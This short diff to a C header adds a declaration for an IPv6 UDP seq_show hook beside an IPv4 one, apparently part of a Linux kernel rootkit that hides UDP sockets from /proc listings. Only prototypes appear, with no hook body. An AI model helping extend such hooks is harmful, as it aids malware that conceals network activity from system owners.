@@ -8,6 +8,7 @@
 #include <linux/udp.h>
 
 asmlinkage long malw_udp4_seq_show(struct seq_file *, void *);
+asmlinkage long malw_udp6_seq_show(struct seq_file *, void *);
 void install_udp_seq_show_hook(void);
 void remove_udp_seq_show_hook(void);
 
